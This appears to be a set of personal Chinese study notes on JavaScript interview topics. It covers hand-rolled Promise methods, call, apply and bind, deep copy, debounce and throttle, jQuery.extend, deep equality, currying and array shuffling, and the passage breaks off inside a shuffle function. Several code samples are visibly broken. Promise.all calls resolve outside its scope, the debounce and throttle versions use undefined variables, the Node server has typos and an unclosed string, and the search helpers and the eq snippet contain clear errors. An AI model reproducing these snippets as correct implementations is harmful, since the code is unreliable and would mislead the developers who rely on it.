	 (2) Promise.resolve()：转化为promise对象 👆
	     
	     参数：[thenable：有 .then 方法的对象]
	     
	       * promise 对象：
	            返回 promise 对象
		    
	       * .thenable 对象：
	            转为 Promise 对象，然后执行 .then 方法
		    
	       * 原始类型与非 thenable 对象：
	            作为 新promise对象 异步结果
	     
	        Promise.resolve = function(value) {
		  if (value instanceof this) /*若是 promise 对象直接返回*/
		    return value
		  
		  var promise = new Promise(function(resolve, reject) {
		    resolvePromise(promise, value, resolve, reject)
		  })
		  return promise
		}
		
	 
		     
	 (3) Promise.race(iterable)：采用iterable中最先改变状态的promise对象的值
	 
	     ez：promise 状态只会改变一次

			Promise.race = function (promises) {
			  return new Promise((resolve, reject) => {
			    for (var i = 0; i < promises.length; i++) {
			      promises[i].then(value => {/*最先改变状态对象值*/
				return resolve(value)
			      }, reason => {
				return reject(reason)
			      })
			    }
			  })
			}
			
	 (4) Promise.all(iterable)：iterable中所有promise对象返回值
	 
	     hard：1. promise 链式调用
	           2. 闭包判断是否所有promise都已返回值
			
		    	Promise.all = function(promises) {
			  var i = 0
			  var len = promises.length
			  var arr = []
			  function processData(idx, value) {
			    i++
			    arr[idx] = value
			    if (i == len) return resolve(arr)
			  }
			  return new Promise((resolve, reject) => {
			    for (var i = 0; i < len; i++) {
			      Promise.resolve(promises[i]).then(value => {
				processData(i, value)
			      }, reason => {
				return reject(reason)
			      })
			    }
			  })
			}


	 (4) p.finally(cb)：不管 promise 对象状态如何都会执行

	     hard：1. cb 异步执行
	     	   2. then 的特例（封装两次操作）

		    	Promise.prototype.finally = function (cb) {
			  let P = this.constructor;
			  return this.then(
			    value  => P.resolve(cb())/*处理 cb异步执行*/
			    .then(() => value),

			    reason => P.resolve(cb())
			    .then(() => { throw reason })
			  );
			};



	 (4) p.catch()：防止异常被吃掉

		    	Promise.prototype.catch = function(onRejected) {
			  return this.then(null, onRejected)
			}
			
		 
	 5.  实现 Deferred
	 
	     外层包装了一个 Deferred 构造函数：
	       1. 将 new Promise 作为实例对象, 
	       2. 然后把 then 和 catch 方法作为实例方法
	     
		var Promise = global.Promise || require('es6-promise').Promise;

		var Deferred = function() {
		
		   this.promise = new Promise((function(resolve, reject) {
		     this.resolve = resolve;
		     this.reject = reject;
		   }).bind(this));

		  this.then = this.promise.then.bind(this.promise);
		  this.catch = this.promise.catch.bind(this.promise);
		};

		module.exports = Deferred;


一、实现一个call、apply 与 bind

	1. call 与 apply
	  一句话概括：(1) call() 方法在使用一个指定的 this 值和若干个指定的参数值的前提下调用某个函数或方法。
	  
	  	    (2) call() 改变了 this 指向（传 null 时指向 window）
		    (3) call() 函数执行了（1.函数本身可以有返回值呐 2. 执行完删除该属性）
		
	     (1) call() 的实现：
	     
		1) 问题：context.fn(args.join(','))？
		  肯定不行啦, 所有参数拼接为字符串都作为第一个参数传入啦
		  
		  bar.call2(obj, 'kevin', 18) =>
		  name: "kevin,18"
		  age: undefined
		  
		
		    Function.prototype.call2 = function (context) {
		      var context = context || window;
		      context.fn = this;

		      var args = [];
		      // 执行后 args为 ["arguments[1]", "arguments[2]", "arguments[3]"]
		      for(var i = 1, len = arguments.length; i < len; i++) {
			  args.push('arguments[' + i + ']');
		      }
		      // eval 中 args 会自动调用 toString() 方法
		      var result = eval('context.fn(' + args +')');

		      delete context.fn
		      return result;
		    }
		    
		    2) es6 方法实现：
		       
		       var result = context.fn(...[].slice.call(arguments, 1))
		      
		 
	       (2) apply() 的实现：（多一个arr判断）
	       		
		    Function.prototype.apply = function (context, arr) {
		      var context = Object(context) || window;
		      context.fn = this;

		      var result;
		      if (!arr) 
		      	result = context.fn();
		      else {
			  var args = [];
			  for (var i = 0, len = arr.length; i < len; i++) {
			      args.push('arr[' + i + ']');
			  }
			  result = eval('context.fn(' + args + ')')
		      }
		      delete context.fn
		      return result;
		    } 
	
	2. bind
	  一句话概括： (1) 返回了一个函数
		     (2) 改变了 this 指向，可以两次传参 [1. bind 2. 执行返回函数]
		     
		     (3) 返回函数也能使用 new 操作符创建对象
		            I. this 改为指向实例，但传入的参数依然生效
			    II. 原型式继承
		     
		       /**
			* 在全局和foo中都声明了 value 值，最后依然返回了 undefined，说明绑定的 this 已经失效了
			* this 已经指向了 obj [new 的模拟实现]
			*
			* 实际测试 bind 返回函数不作为构造函数的话，是不会进行原型继承的
			* => bar.prototype.friend = undefined
			*/
			var value = 2;
			var foo = {
			    value: 1
			};

			function bar(name, age) {
			    this.habit = 'shopping';
			    console.log(this.value);
			    console.log(name);
			    console.log(age);
			}
			bar.prototype.friend = 'kevin';

			var bindFoo = bar.bind(foo, 'daisy');

			var obj = new bindFoo('18');
			// undefined
			// daisy
			// 18
			console.log(obj.habit); // shopping
			console.log(obj.friend); // kevin
		 
		 (4) bind 的实现
		 	
			Function.prototype.bind2 = function (context) {

			    if (typeof this !== "function") {
			      throw new Error("Function.prototype.bind - what is trying to be bound is not callable");
			    }

			    var self = this;
			    var args = Array.prototype.slice.call(arguments, 1);

			    var fNOP = function () {};

			    var fBound = function () {
				var bindArgs = Array.prototype.slice.call(arguments);
				// 判断是否通过 new 调用
				return self.apply(this instanceof fBound ? this : context, args.concat(bindArgs));
			    }

			    fNOP.prototype = this.prototype;
			    fBound.prototype = new fNOP();
			    return fBound;
			}
			
			
二、深浅 copy ---> 参数按值传递

	1. shallow copy
	 (1)  一句话概括：数组元素是 primitive，就 copy 一份，互相不影响。
	      但如果是数组或对象，只会 copy 对象和数组的引用，所以无论在新旧数组进行修改，都会发生变化。
	  
	    arr.slice | concat() | es6 [...arr] // 返回一个新数组
	    
	 (2) 浅 copy 的实现
	   1) copy 是否为对象「类型判断是数组 or 对象」
	   2) 遍历并且确定是对象自身属性才 copy
	   
	    var shallowCopy = function(obj) {
	    
	      if (typeof obj !== 'object') return; // 只拷贝对象
	       
	      var newObj = obj instanceof Array ? [] : {};
	      for (var key in obj) {
	  	  if (obj.hasOwnProperty(key)) {
		      newObj[key] = obj[key];
	  	  }
	      }
	      return newObj;
	    }
	   
	 (3) 深 copy 的实现
	       多了判断 copy 对象的属性类型（是对象递归进行深copy）
	   
		var deepCopy = function(obj) {
		    if (typeof obj !== 'object') return;
		    var newObj = obj instanceof Array ? [] : {};
		    for (var key in obj) {
			if (obj.hasOwnProperty(key)) {
			    newObj[key] = typeof obj[key] === 'object' ? deepCopy(obj[key]) : obj[key];
			}
		    }
		    return newObj;
		}


十一、函数节流防抖
	1. 什么是防抖：短时间内虽然事件持续触发，但只有等事件停止触发后 n 秒才执行函数
	    search 搜索联想：用户在不断输入值时，用防抖来节约请求资源
	    window 触发 resize 事件，不断的调整浏览器窗口大小会不断的触发这个事件，用防抖来让其只触发一次
	    
		(1) 你尽管触发事件，但是我一定在事件触发 n 秒后才执行
			
	 	(2) this 与 arguments 对象
		    一个小 tips：在 debounce 作用域声明变量 var timeoutId 来保存「闭包作用域」定时器 id 
		    与直接挂载在函数「对象」id 属性都可以达到同样的效果! --> 惰性函数

		
			function debounce (fn, delay) {
			  return function () {
			    var context = this, args = arguments // 可能传入 event 对象
			    clearTimeout(fn.id)

			    fn.id = setTimeout(function() {
			      fn.apply(context, args)
			    }, delay)
			  }
			}
			
		(3) 立即执行
		    不希望事件停止触发后才执行，希望立刻执行函数，然后等到停止触发 n 秒后，才可以重新触发执行
		    
		    关键：清除定时器后，定时器的 id 仍然存在于内存中
			
			function debounce (fn, delay， immediately) {
			  return function () {
			    var context = this,
				args = arguments
				
			    if (fn.id) clearTimeout(fn.id) 
			      
			    if (immediately) {
			      var callNow = !timeout
			      // 与定时器节流原理相同
			      fn.id = setTimeout(function() {
				  fn.id = null
				}, delay)
			      if (callNow) {
				result = fn.apply(context, args)
			      }
			    } else {
				fn.id = setTimeout(function() {
				  return fn.apply(context, args)
				}, delay)
			      }
			      return result
			   }
			   debounce.cancel = () => { // 取消 debounce，触发又可以立即执行
			      clearTimeout(fn.id)
			      fn.id = null
			   }
			}
		
				
        2. 什么是节流：节流是连续触发事件的过程中以一定时间间隔执行函数。节流会稀释你的执行频率。
	    比如每间隔1秒钟，只会执行一次函数，无论这1秒钟内触发了多少次事件「都为解决高频事件而来
	    scroll mousewhell mousemover touchmove onresize」
	
	    鼠标不断点击：单位时间内只触发一次 mousedown 
	    监听滚动事件：用 throttle 来判断是否滑到底部自动加载更多
	    
		(1) 时间戳（
		      a.起始的时间戳 = 0 
		      b.「当前时间戳-之前的时间戳」 > delay ? 执行函数并 !!更新时间戳 : 不执行
		      
			function throttle (fn, delay) {
			  var last = 0
			  if (!last) last = 0
			  return function () {
			    var context = this,
				args = arguments
			    var now = +new Date()
			    if (now - last > delay) {
			      fn.apply(context, args)
			      last = now // 核心2
			    }
			  }
			}
			
		(2) 定时器
		  a.触发事件时，设置一个定时器「执行函数后清空定时器」
		  b.再次触发时「若定时器存在，不执行函数」
		  
			function throttle (fn, delay) {
			  return function () {
			      var context = this,
				  args = arguments
			    if (!fn.id) {
			      fn.id = setTimeout(function() {
				fn.id = null
				fn.apply(context, args)
			      }, delay)
			    }
			  }
			}
			
		(3) 我们希望鼠标移入能立刻执行，停止触发的时候还能再执行一次
		    a. 因为需要立即执行，所以先判断是否满足时间戳方式
		    b. 若不满足再执行定时器节流「一定要记得更新时间戳呐!」
		
			function throttle(func, wait) {
			  var context, args, result;
			  var previous = 0;

			  var later = function() {
			      previous = +new Date();
			      fn.id = null;
			      func.apply(context, args)
			  };

			  var throttled = function() {
			      var now = +new Date();
			      //下次触发 func 剩余的时间
			      var remaining = wait - (now - previous);
			      context = this;
			      args = arguments;
			      if (remaining <= 0 || remaining > wait) {
				  if (fn.id) {
				      clearTimeout(fn.id);
				      fn.id = null;
				  }
				  previous = now;
				  func.apply(context, args);
			      } else if (!fn.id) {
				fn.id = setTimeout(later, remaining);
			      }
			  };
			  return throttled;
			}


		(4) 设置 options 为第三个参数，然后根据传入的值判断到底是哪种效果
		    a. leading: false 表示禁用第一次执行,
		    b. trailing: false 表示禁用停止触发的回调
		
			function throttle (fn, delay, options) {
			  var last = 0
			  
			  var throttled = function () {
			    var later = () => { 
			      last = options.leading === false ? 0 : +new Date()
  			      fn.id = null
			      fn.apply(context, args)
			    }	
			  
			    var context = this, 
				args = arguments, // event 对象
			        now = +new Date() 
				
			    if (!last && options.leading == false) last = now
			    var remain = delay-(now - last)

			    // 没有剩余时间或你修改了系统时间
			    if (remain <= 0 ||  remain > delay) { 
			      if (timeout) {
				clearTimeout(timeout);
				timeout = null;
			      }
			      fn.apply(context, args)
			      last = now
			      if (!timeout) context = args = null
			    } 
			    else if (!fn.id && !options.trailing) {
				fn.id = setTimeout(later, remain)
			    }
			  }
			  throttled.cancel = function() { // 取消 throttle，触发又可以立即执行
			    clearTimeout(timeout);
			    last = 0;
			    timeout = null;
			  }
			  return throttled
			}


三、实现 Jquery.extend() ---> 深浅 copy

	1. jQuery.extend( target [, object1 ] [, objectN ] )
	    
	 (1) extend「 浅copy」
	   1) 合并对象到第一个对象中「不拷贝 undefined 属性!」
	   2) 后者会覆盖前者同名属性
	   
		  /**
		   * @variable {待 copy 对象} options
		   * @variable {待 copy 属性} name
		   * @variable {待 copy value} copy
		   */
		  function extend() {
		    var name, options, copy;
		    var length = arguments.length,
			target = arguments[0];

		    for (let i = 1; i < length; i++) {
			options = arguments[i];
			if (options != null) { // 避免 extend(a ,, b)的情况
			    for (name in options) {
				copy = options[name];
				if (copy !== undefined){
				    target[name] = copy;
				}
			    }
			}
		    }
		    return target;
		  };

       2.jQuery.extend( [deep], target, object1 [, objectN ] )
         
	 (1) extend「深copy」 
	   1) deep「决定是否深 copy」
	   2) 因为采用了深拷贝，会遍历到更深的层次进行添加和覆盖
	   
	 (2) 类型不一致
	     出现原因：当递归到第三次调用 deepCopy() 的时候, 因为 src 是 primitive，我们默认使用 {}「空对象」 作为 target!
	    	var src = 2; // Number
		var copy = [5]; // [object Array]

		target[name] = extend(true, src, copy);

	   
	     var obj1 = {                  var obj2 = {
	       a: 1,                         b: {
	       b: {                            c: [5],
	   	   c: 2                      }
	       }                           }
	     }
	     
	     var d = extend(true, obj1, obj2)
	     
	     // 预期返回的对象               // 实际返回的对象
	     {                             {
	       a: 1,                         b: {
	       b: {                            c: {
	         c: [5]                          0: 5
	       }                               }
	     }                                }
	   				    }
	   
	   解决方案：我们对 copy 与 src 的属性值进行判断就行 ---> 类型判断
	   
	     	  // 对 typeof === 'object' 类型划分为「对象」「数组」
		  // 防止类型不一致
		  if (deep && copy && (isPlainObject(copy) ||
			(copyIsArray = Array.isArray(copy)))) {
		    if (copyIsArray) {
			copyIsArray = false;
			clone = src && Array.isArray(src) ? src : [];

		    } else {
			clone = src && isPlainObject(src) ? src : {};
		    }
		    target[name] = extend(deep, clone, copy);

		  } else if (copy !== undefined) {
		      target[name] = copy;
		  }
	   
	   (3) 循环引用 ---> 对象的判断
	   
		     let a = {name : b}
		     let b = {name : a}
		     extend(a, b);

		     if (target === copy) {/*copy属性 === 目标对象 => 循环引用*/
			    continue;
		      }  
	   
		var class2type = {};
		var toString = class2type.toString;
		var hasOwn = class2type.hasOwnProperty;
		/**
		 * deep: 是否深拷贝, clone: 目标对象 [类型不一致]
		 * options: copy 对象, src: 目标对象, copy: 待拷贝属性
		 */
		function extend() {
		  var deep = false;
		  var name, options, src, copy, clone, copyIsArray;
		  var length = arguments.length;
		  var i = 1;
		  var target = arguments[0] || {};/*对象才能拷贝*/
		  if (typeof target == 'boolean') {
		    deep = target;
		    target = arguments[i] || {};
		    i++;
		  }
		  if (typeof target !== "object" && !isFunction(target)) {
		    target = {};
		  }

		  for (; i < length; i++) {
		    options = arguments[i];

		    if (options != null) { /*避免 extend(a,,b) 这种情况*/
		      for (name in options) {
			src = target[name], copy = options[name]

			if (target === copy) {/*解决循环引用*/
			  continue;
			}
			/*属性存在时判断类型不一致情况*/
			if (deep && copy && (isPlainObject(copy) || (copyIsArray = Array.isArray(copy)))) {
			  if (copyIsArray) {
			    copyIsArray = false;
			    clone = src && Array.isArray(src) ? src : [];
			  } else {
			    clone = src && isPlainObject(src) ? src : {};
			  }
			  target[name] = extend(deep, clone, copy);/*deepCopy*/
			} else if (copy !== undefined) {
			  target[name] = copy;/*shallowCopy*/
			}
		      }
		    }
		  }
		  return target;
		};


五、实现一个函数clone，可以对JavaScript中的5种主要的数据类型（包括Number、String、Object、Array、Boolean）进行值复制
    
    Object.prototype.clone = function() {
      var newObject = this.constructor === Array ? [] : {}  //对象的深拷贝 获取对应的构造函数 [] 或者 {}
      for (let e in this) { //遍历对象的属性 in  this[e]
      	// //对象中的属性如果还是对象 那就继续递归 否则就返回基本的数据类型
        newObject[e] = typeof this[e] === 'object' ? this[e].clone() : this[e]  
      }
      return newObject
    }
 

七、发布订阅者模式（观察者模式）

var event = {}; // 发布者
event.clientList = [] //发布者的缓存列表

event.listen = function (fn) {  // 增加订阅者函数
  this.clientList.push(fn)
}

event.trigger = function () {  // 发布信息
  for (var i =0;i<this.clientList.length;i++) {
    var fn = this.clientList[i];
    fn.apply(this, arguments);
  }
}

event.listen (function(time) {
  console.log('正式上班时间为：' +time)
})
event.trigger ('2018/7')

八、手动写一个node服务器
const http = require('http');
const fs = require('fs');
const server = http.createServer((req,res) => {
	if (reu.url == '/') {
	const indexFile = fs.createReadStream('./index.html')
	req.writeHead(200,{'context-Type':'text/html;charset = utf8})
	indexFile.pipe(res)
}
server.listen(8080)


九：数组扁平化、去重、最值

    (1) 扁平化
    	
    	function flatten(arr) { /*循环数组，如果还是一个数组，就递归调用该方法*/
	  var result = [];
	  for (var i = 0, len = arr.length; i < len; i++) {
	    if (Array.isArray(arr[i])) {
	      result = result.concat(flatten(arr[i]))
	    }
	    else {
	      result.push(arr[i])
	    }
	  }
	  return result;
	}
    
    	原理：每次都 concat() 一个元素
	function flatten(arr) { /*因为最终只返回一个值呐*/
	    return arr.reduce(function(item, idx){
		return item.concat(Array.isArray(idx) ? flatten(idx) : idx)
	    }, [])
	}
	
	es6：
	  a. 原理：每次都 concat() 整个数组
	       var arr = [1, [2, [3, 4]]]
	       [].concat(...arr) // [1, 2, [3, 4]]
	       
	  b. some(): 只要有一个 cb 返回 true，方法返回 true     
	
	function flatten(arr) {
	  while (arr.some(item => Array.isArray(item))) { /*效率低，每次都要循坏数组*/
	    arr = [].concat(...arr);
	  }
	  return arr;
	}
	
	
    (2) 去重
    	
	function unique(array) { /*indexOf简化内层for循环*/
	  var res = [];
	  for (var i = 0, len = array.length; i < len; i++) {
	      var current = array[i];
	      if (res.indexOf(current) === -1) {
		  res.push(current)
	      }
	  }
	  return res;
	}
	
	
	function unique(array) { /*因为最终是遍历时候筛选元素*/
	  var res = array.filter(function(item, index, array){
	      return array.indexOf(item) === index;
	  })
	  return res;
	}

	var unique = (a) => [...new Set(a)] /*set没有重复的成员*/

	
    (3) 最值
        Math.max([val1[,val2, ...]]) /*数组元素都是Number类型*/
    	
	  arr.sort((a, b) => b-a)[arr.length-1] /*排序(慢)*/
	
	  arr.reduce((acc, item) => {
	    return acc = Math.max(acc, item) /*最终只返回一个最大值呐*/
	  })
	

	  Math.max.apply(null, arr) /*将数组转化为参数序列!!*/
	  Math.max(...arr)
	
	

十：数组中查找指定元素
通过 dir 精简 findIndex 与 findLastIndex 的冗余内容
function createIndexFinder (dir) {
  return function (cb, context) {
    // context = context | this 没有意义呐!因为不需要通过 this 来访问数组元素属性，数组是特殊的对象..
    
    let arr = this, len = arr.length

    // !正序查找和逆序查找
    let idx = dir > 0 ? 0 : len
    for(;idx >= 0 && idx < len; idx += dir) {
      cb.call(context, arr[i], idx, arr) // context 为 null，this 指向 window
    }
  }
}

2.实现 indexOf
void：对给定的表达式进行求值，然后返回 undefined （一般 undefined 会写作 void 0）
通用 sortedIndex 实现：可以通过 iteratee 对每个数组元素进行处理
function sortedIndex(arr, search, iteratee, context) { // iteratee
  let left = 0, right = arr.length

  while (left < right) {
    let mid = Math.floor((left + right) / 2)
    if (iteratee.call(context, arr[mid]) === search) {
      return mid
    } 
    else if (iteratee.call(context, arr[mid]) < search) {
      left = mid + 1
    } else {
      right = mid - 1
    }
  }
  return -1
}



优化 1.支持查找 NaN
    2.如果 indexOf 第三个参数不传开始搜索的下标值，而是一个布尔值 true，就认为数组是一个排好序的数组，这时候，就会采用更快的二分法进行查找
function createIndex(dir, indexFinder, sortedIndex) {
  return function (arr, search, from) {
    let i = 0, len = arr.length,
        idx

    if (typeof from === 'number') {
      if (dir > 0) {
        i = from >= 0 ? from : Math.max(from + len, 0)
      } else {
        // 先确定遍历数组的长度，len 为遍历数组长度（数组长度=索引+1）
        len = from >= 0 ? Math.min(len, from + 1) : from + len + 1
      }
    } 

    else if (sortedIndex && from && len) {
      idx = sortedIndex(arr, search)
      return arr[idx] === search ? idx : -1
    }

    if (indexFinder && search !== search) {
      // return indexFinder(arr, isNaN) // 这样太慢了
      idx = indexFinder(arr.slice(i, len), isNaN)
      return idx >= 0 ? idx + i : -1 // 返回在原数组中的索引
    }

    // !正序和逆序查找
    for (idx = dir > len - 1 ? i : len; idx >= 0 && idx < len; idx += dir) {
      if (arr[idx] === search) return idx
    }
    return -1
  } 
}

十一：对象判等
题目： NaN 和 NaN、[1]  和 [1]、{value: 1} 和 {value: 1} 是相等
      1 和 new Number(1)、'Curly' 和 new String('Curly')、true 和 new Boolean(true) 是相等
     
    思路：
      1. 基本类型判断  
      2. 深度比较
    
    1.基本类型判断：发现少了一句 typeof b !== function？其实若加上，当 a 是基本类型，而 b 是函数的时候，就会进入 deepEq()。
      实际上 基本类型和函数肯定是不会相等的
    
	function eq(a, b) {
	  if (a === b) {
	    return a !== 0 || 1/a === 1/b // 区别出 +0（Infinity） 与 -0（-Infinity）
	  }
	  // typeof null 为 'object', 使 null 尽早退出循环
	  if ( a=== null || b === null) return false 
	  
	  if (a !== a) return b !== b 	  // 判断 NaN 呐

	  var type = typeof a;
	  if (type !== 'function' && type !== 'object' && typeof b != 'object') return false;

	  return deepEq(a, b) // 深度比较
	}
    
    2. 深度比较
      (1) 包装对象与基本类型相等
        a. 两者 typeof 的类型都不一样，该怎么判断呢？使用更多类型判断的方法 Object.prototype.toString。
	b. 若类型相同，再用隐式转换为 primitive 进行比较!
      
        function deepEq(a, b) {
	    // 判断两个对象字符串表示是否相同（对象内部[[class]]属性） --> 类型判断
	    var className = toString.call(a); 
	    if (className !== toString.call(b)) return false;

	    switch (className) {
	    	// 隐式转 String 判断
		case '[object RegExp]': 
		case '[object String]':
		    return '' + a === '' + b;
		// 隐式转 Number 判断
		case '[object Number]':
		    if (+a !== +a) return +b !== +b;
		    // 别忘了 NaN
		    return +a === 0 ? 1 / +a === 1 / b : +a === +b;
		case '[object Date]':
		case '[object Boolean]':
		    return +a === +b;
	    }
	}
	
  	(2) 晒选构造函数
          a. 构造函数都存在且不相等，两个对象不等
	  b. 若为 Object 构造函数，只要他们有着相同的键值对，我们依然认为是相等。

	    var areArrays = className === '[object Array]'; // 不是数组
	    
	    if (!areArrays) {
		// 过滤掉非两个对象情况
		if (typeof a != 'object' || typeof b != 'object') return false;

		var aCtor = a.constructor,
		    bCtor = b.constructor;
		if (('constructor' in a && 'constructor' in b)) && 
		    aCtor !== bCtor && 
		    // 只有 Obejct instanceof Obejct === true（Function.prototype 也是对象）
		    !(isFunction(aCtor) && aCtor instanceof aCtor && 
		    isFunction(bCtor) && bCtor instanceof bCtor) {
		    	return false;
		}
	    }
	    
	  (3) 终于到了对象判断
	  通过筛选条件，「递归」调用 eq() 进行比较就可以实现了呐!
	  
            a. 循环引用：对象「引用 自身 !!」作为属性!栗子：
	        a = {abc: null}, b = {abc: null};
		a.abc = a, b.abc = b
	
	 	解决：多传入两个栈「储存 a 和 b 递归比较过程中的 a 和 b 的值!!」
		eq(a, b) // !!!每次比较都遍历栈，检查栈中是否有两个相同的对象「机智」
		
	   
	   b. 区分数组与对象

	        aStack = aStack || [], bStack = bStack || []
		var len = aStack.length;

		while (len--) { // 检查是否有循环引用的部分
		    if (aStack[len] === a) {
			return bStack[len] === b;
		    }
		}
		aStack.push(a), bStack.push(b);
		
		if (areArrays) { // 数组判断
		  len = a.len;
		    if (len !== b.length) return false;

		    while (len--) {
			if (!eq(a[len], b[len], aStack, bStack)) return false;
		    }
		}
		else { 
		    var keys = Object.keys(a), key; // 对象判断
		    len = keys.length;

		    if (Object.keys(b).length !== len) return false;
		    while (len--) {

			// 循坏引用：a = { foo: { b: { foo: { c: { foo: null } } } } }「a.foo.b.foo.c.foo === a」
			key = keys[len];
			if (!(b.hasOwnProperty(key) && eq(a[key], b[key], aStack, bStack))) return false;
		    }
		}
		aStack.pop(), bStack.pop()  // 递归判断完依次弹出栈中元素
		return true;
		
		
十二、偏函数+函数柯里化

	1. 偏函数
	 (1)  固定一个函数的一个或者多个参数「将一个 n 元函数转换成一个 n - x 元函」
	 (2)  函数柯里化是自动化偏函数的应用
	  
	    
	   实现如下：
	   1) 我们可以直接使用 bind 呐!「改变了 this指向，我们写一版不改变 this 指向的」
	   2) 可以传入占位符对象
	   测试一下：
	        var subtract = function (a, b) { return b - a; };
		subFrom20 = partial(subtract, _, 20);
		subFrom20(5);
            
		var _ = {}; // 下划线对象是一个占位符
		function partial(fn) {
		  var args = [].slice.call(arguments, 1);
		  return function () {
		    var position = 0, len = args.length;
		    for (var i = 0; i < len; i++) {
		      // 替换占位符「不要忘记移动指针呐」
		      args[i] = args[i] === _ ? arguments[position++] : args[i]
		    }
		    // 合并剩余的参数
		    while (position < arguments.length)
		      args.push(arguments[position++]);
		    return fn.apply(this, args);
		  };
		};
		
		
	2. 柯里化
	      使用多个参数的一个函数转换成一系列使用一个参数的函数的技术
	    
	   实现如下：
	   1) curry 函数
	     包裹 sub_curry 
	     递归将新旧参数传入 curry 函数「递归出口：所有参数合并完毕」，并
	   2) 辅助函数
	     包裹 执行函数 
	     辅助函数只能进行一次参数合并，需要 curry 传入混合的所有参数作为固定参数
	     
		function sub_curry(fn) { // 辅助函数
		  var args = [].slice.call(arguments, 1);
		  return function () {
		    return fn.apply(this, args.concat([].slice.call(arguments)));
		  };
		}

		function curry(fn, length) { // 柯里化函数

		  length = length || fn.length; // 函数形参个数
		  var slice = Array.prototype.slice;

		  return function () {
		    // 递归出口
		    if (arguments.length < length) {
		      var combined = [fn].concat(slice.call(arguments));
		      return curry(sub_curry.apply(this, combined), length - arguments.length);
		    } else {
		      return fn.apply(this, arguments);
		    }
		  };
		}	
	  
	  
	 2. 惰性函数
	      惰性函数就是解决每次都要进行判断的这个问题，解决原理很简单：重写函数
	    
	   实现如下：
	   1) 我们现在需要写一个 foo 函数，这个函数返回首次调用时的 Date 对象，注意是首次。
	   
		function foo() {
		  if (t) return t;
		  t = new Date()
		  return t;
		}
	    1. 污染了全局变量
	    2. 每次都要进行一次判断

		(function foo() { // 闭包
		  // same code
		})()

		function foo() { // 函数对象
		  // same code
		  foo.t = new Date()
		}
		
		var foo = function () {  // 惰性函数「重写函数」
		  foo.t = new Date()
		  foo = function () {
		    return foo.t
		  }
		  return foo() // 不是 return foo.t 哦!
		}
		
		
	    2) 更多应用
	    
	       跨浏览器事件处理程序，为了兼容现代浏览器和 IE 浏览器，我们需要对浏览器环境进行一次判断：
	       
	         1. 先判断 DOM2 级方法 [兼容性]
		 2. 再使用 DOM0 级方法
	    	
		function addEvent (type, el, fn) { // removeEvent
		    if (window.addEventListener) {
			el.addEventListener(type, fn, false); // removeEventListener
		    }
		    else if(window.attachEvent){
			el.attachEvent('on' + type, fn); // detachEvent
		    } else {
		    	el['on' + type] = fn //  = null
		    }
		}
	  
	   利用惰性函数，我们可以这样：

		  function addEvent (type, el, fn) {
		    if (window.addEventListener) {
			addEvent = function (type, el, fn) {
			    el.addEventListener(type, fn, false);
			}
		    }
		    else if(window.attachEvent){
			addEvent = function (type, el, fn) {
			    el.attachEvent('on' + type, fn);
			}
		    }
		}
		
	   当然也可以用闭包：
		  var addEvent = (function(){
		    if (window.addEventListener) {
			return function (type, el, fn) {
			    el.addEventListener(type, fn, false);
			}
		    }
		    else if(window.attachEvent){
			return function (type, el, fn) {
			    el.attachEvent('on' + type, fn);
			}
		    }
		})();
		





	    
十四：Js 乱序

       乱序的意思就是将数组打乱，一个常见的写法就是 Math.random()
       
        var values = [1, 2, 3, 4, 5];

	values.sort(function(){ /*我们可以指定按照某种顺序进行排列的函数*/
	    /*
	       Math.random: 随机得到一个正数、负数或零「不断的升序或降序将得到一个乱序数组」
	       正数: 降序排列
	       负数: 升序排列
	       零: 不变
	     */
	    return Math.random() - 0.5;
	});
	
	但是在测试乱序后数组效果的时候，却发现实现的不是真正的乱序
	将[1, 2, 3, 4, 5] 乱序 10 万次，计算乱序后的数组的最后一个元素是 1、2、3、4、5 的次数分别是多少。
	
	一次随机的结果为：
	[30636, 30906, 20456, 11743, 6259]
	
	1. 排序原理「插入排序」
	v8 在处理 sort 方法时，当目标数组长度小于 10 时，使用插入排序；反之，使用快速排序和插入排序的混合排序
	
	!!「重要」comparefn(a, b)：指定比较的两元素排列顺序
	  	   < 0 ，那么 a 排到 b 之前
	 	   > 0 ，那么 b 排到 a 之前
	
		function Sort(comparefn) { /*处理过后的v8源码*/

		  var array = TO_OBJECT(this);
		  var length = TO_LENGTH(array.length);
		  return InnerArraySort(array, length, comparefn); /*内部使用为快速排序*/
		}
	
		源码：
			function InsertionSort(a, from, to) {
			    for (var i = from + 1; i < to; i++) {
				var element = a[i];
				for (var j = i - 1; j >= from; j--) {
				    var tmp = a[j];
				    /*
				      因为我们使用Math.random, 所以进行随机插入以达到乱序
				     */
				    var order = comparefn(tmp, element);
				    if (order > 0) {
					a[j + 1] = tmp;
				    } else {
					break;
				    }
				}
				a[j + 1] = element;
			    }
			};
			
			
	2. 明白了插入排序的原理，我们来具体分析下过程
	
	sort() 底层使用插入排序，InsertionSort 函数的 from 的值为 0，to 的值为 3
	
	  1. 插入排序视第一个元素为有序的，所以数组的外层循环从 i = 1 开始
	  
	  2. a[i] = 2，此时内层循环遍历，比较 compare(1, 2)「Math.random() - 0.5 的结果有 50% 的概率小于 0 ，有 50% 的概率大于 0」
	    j 的变化(寻找插入位置)
	    
	     2.1  50% 的概率数组变成 [2, 1, 3]
	     2.2  50% 的结果不变，数组依然为 [1, 2, 3]
	  
	  3. 我们只分析[1, 2, 3]一种情况，另一种与之情况相同
	    i 的变化(下一个插入元素)
	     接着遍历，i = 2，a[i] = 3，此时内层循环遍历，比较 compare(2, 3)
	     
	     3.1  50% 的概率数组不变，依然是 [1, 2, 3]，然后遍历结束
	     3.2  50% 的概率变成 [1, 3, 2]，因为 3 未找到插入位置(元素后移，继续寻找插入位置), 比较 compare(1, 3)
	    	 a. 50% 的概率不变，数组为 [1, 3, 2]，结束
		 b. 50% 的概率发生变化，数组变成 [3, 1, 2]，结束
		
		
	    数组      |     i = 1	    |    i = 2      |      总计
	------------ | ------------- | ------------- | -------------
		     |               | 50% [1, 2, 3] | 25% [1, 2, 3]  | 
		     | 50% [1, 2, 3] | 25% [1, 3, 2] | 12.5% [1, 3, 2]| 
	  [1, 2, 3]  | ------------- | 25% [3, 1, 2] | 12.5% [3, 1, 2]| 
		     |               | 50% [2, 1, 3] | 25% [2, 1, 3]  | 
		     | 50% [2, 1, 3] | 25% [2, 3, 1] | 12.5% [2, 3, 1]| 
		     |               | 25% [3, 2, 1] | 12.5% [3, 2, 1]| 	
		     
	
	3. 根本原因
	所以根本原因在于什么呢？
	  其实就在于在插入排序的算法中，当待排序元素跟有序元素进行比较时，一旦确定了位置，就不会再跟位置前面的有序元素进行比较，所以就乱序的不彻底
	  
	4. 彻底的乱序算法
	原理很简单：遍历数组元素，然后将当前元素与以后随机位置的元素进行交换
	
		function shuffle(a) {
